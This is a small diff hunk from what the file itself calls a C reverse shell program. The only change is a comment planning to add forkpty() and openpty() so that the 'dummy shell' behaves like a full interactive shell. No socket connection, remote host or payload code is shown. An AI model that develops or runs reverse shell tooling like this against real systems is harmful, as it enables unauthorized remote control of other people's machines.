@@ -18,7 +18,7 @@
 #include <fcntl.h>
 #include <string.h>
 
- int main() {
+ int main() {                                           //Need to add forkpty() and openpty() for pseudo terminal so dummy shell can really act as normal shell
  
   printf("This is a reverse shell program\n");
   struct sockaddr_in addr;
